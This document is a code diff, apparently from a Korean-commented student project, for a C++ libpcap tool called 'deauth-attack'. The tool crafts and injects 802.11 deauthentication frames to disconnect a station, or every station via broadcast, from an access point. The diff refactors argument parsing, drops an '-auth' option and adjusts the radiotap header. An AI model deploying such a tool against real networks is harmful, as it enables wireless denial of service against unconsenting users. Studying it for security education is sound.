@@ -19,23 +19,16 @@
 using namespace std;
 
 void usage() {
-	printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
+	printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
 	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
 }
 
-typedef struct {
-	char* dev_;          // 인터페이스 (wlan0, mon0 등)
-    char* ap_mac_;       // AP의 MAC 주소
-    char* station_mac_;  // Station(단말기)의 MAC 주소 (선택)
-    bool auth_flag_;     // -auth 옵션 활성화 여부
-} Param;
+struct Param { // shallow copy로 충분한 간단한 구조체이므로 포인터 대신 string으로 바로 저장
+	string dev_ = "";          // 인터페이스 (wlan0, mon0 등)
+    string ap_mac_ = "";       // AP의 MAC 주소
+    string station_mac_ = "";  // Station(단말기)의 MAC 주소 (선택)
+} param;
 
-Param param = {
-	.dev_ = NULL,
-    .ap_mac_ = NULL,
-    .station_mac_ = NULL,
-    .auth_flag_ = false
-};
 
 bool parse(Param* param, int argc, char* argv[]) {
     // 최소 실행 파일(argv[0]), 인터페이스(argv[1]), AP MAC(argv[2])이 필요하므로 argc는 최소 3이어야 함
@@ -50,24 +43,10 @@ bool parse(Param* param, int argc, char* argv[]) {
 
     // 선택 인자 1: Station MAC이 입력된 경우 (argc >= 4)
     if (argc >= 4) {
-        // 사용자가 실수로 station mac 자리에 -auth를 먼저 적었는지 방어 (usage 규칙 엄수)
-        if (strncmp(argv[3], "-auth", 5) == 0) {
-            printf("[Error] -auth 옵션은 <station mac> 뒤에 와야 합니다.\n");
-            usage();
-            return false; 
-        }
         param->station_mac_ = argv[3];
-    }
-
-    // 선택 인자 2: -auth 옵션이 입력된 경우 (argc == 5)
-    if (argc == 5) {
-        if (strncmp(argv[4], "-auth", 5) == 0) {
-            param->auth_flag_ = true;
-        } else {
-            printf("[Error] 알 수 없는 옵션입니다: %s\n", argv[4]);
-            usage();
-            return false;
-        }
+    } else {
+        // 입력되지 않은 경우 브로드캐스트 주소로 설정
+        param->station_mac_ = "ff:ff:ff:ff:ff:ff";
     }
 
     return true;
@@ -77,7 +56,12 @@ bool parse(Param* param, int argc, char* argv[]) {
 struct RadioTapHdr {
     uint8_t  version_ = 0x00;
     uint8_t  pad_ = 0x00;
-    uint16_t len_ = 12;
+    uint16_t len_ = 12; // 기본 Radiotap 헤더 길이 (8바이트 고정 + 4바이트 present 필드)
+    uint32_t present_ = 0x00000020; // 0x00000000이면 안됨.
+};
+
+struct SendRadioTapHdr : public RadioTapHdr {
+    uint16_t len_ = 8;
     uint32_t present_ = 0x00000000;
 };
 
@@ -116,6 +100,13 @@ struct Mac{
     void print_mac() const {
         printf("%02x:%02x:%02x:%02x:%02x:%02x\n", addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
     }
+
+    string to_string() const {
+        char buf[18]; // "xx:xx:xx:xx:xx:xx" + null terminator
+        snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", \
+                addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
+        return string(buf);
+    }
 };
 
 typedef struct Dot11Hdr {
@@ -132,13 +123,12 @@ typedef struct Dot11Hdr {
         return (subtype_ == 0xc0) && (ver_type_ == 0x00);
     }
 
-    
 } Dot11Hdr;
 
 // Deauth 프레임 전용 구조체 (MAC 헤더 상속 + Reason Code)
 struct DeauthFrame : public Dot11Hdr {
     // 802.11 규격에 따라 MAC 헤더 바로 뒤에 2바이트 이유(Reason) 코드가 붙습니다.
-    uint16_t reason_code_; 
+    uint16_t reason_code_ = 0x0007;
 
     // 인젝션할 패킷을 한 번에 세팅해 주는 초기화 메서드
     DeauthFrame(Mac dest, Mac src, Mac bssid) {
@@ -154,18 +144,14 @@ struct DeauthFrame : public Dot11Hdr {
         addr_2 = src;
         addr_3 = bssid;
         seq_control_ = 0x0000;
-        
-        // [핵심] Reason Code 7: "Class 3 frame received from nonassociated STA"
-        // 단말기에게 "너 우리 AP랑 연결 안 되어있는데 왜 데이터 보내? 당장 끊어!"라고 속이는 마법의 코드입니다.
-        reason_code_ = 0x0007; 
     }
 };
 
 // 최종적으로 메모리에 올릴 전체 패킷 구조체
 struct DeauthPacket {
-    RadioTapHdr rtap;
-    DeauthFrame deauth;
-    
+    SendRadioTapHdr rtap; // 8byte + 4byte (present 필드) = 12byte
+    DeauthFrame deauth; // 24byte (MAC 헤더) + 2byte (Reason Code) = 26byte
+
     DeauthPacket(Mac dest, Mac src, Mac bssid) : deauth(dest, src, bssid) {}
 };
 #pragma pack(pop)
@@ -175,9 +161,9 @@ int main(int argc, char *argv[]) {
         return -1;
 
 	char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
+    pcap_t* pcap = pcap_open_live(param.dev_.c_str(), BUFSIZ, 1, 1000, errbuf);
     if (pcap == NULL) {
-        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
+        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_.c_str(), errbuf);
         return -1;
     }
 		
@@ -187,7 +173,7 @@ int main(int argc, char *argv[]) {
     Mac station_mac;
     bool is_broadcast = false;
     
-    if (param.station_mac_ != NULL) {
+    if (!param.station_mac_.empty()) {
         station_mac = Mac(param.station_mac_);
     } else {
         // 단말기가 지정되지 않으면 브로드캐스트 주소로 설정
@@ -197,12 +183,12 @@ int main(int argc, char *argv[]) {
 
     // 디버깅: 변환된 MAC 주소 확인
     printf("[Target Info]\n");
-    printf("Interface   : %s\n", param.dev_);
+    printf("Interface   : %s\n", param.dev_.c_str());
     printf("AP MAC      : ");
     ap_mac.print_mac();
+    printf("AP MAC (String) : %s\n", ap_mac.to_string().data());
     printf("Station MAC : ");
     station_mac.print_mac();
-    printf("Auth Attack : %s\n", param.auth_flag_ ? "ON" : "OFF");
 
     // 4. 전송할 패킷 조립
     // AP -> Station 패킷 세팅
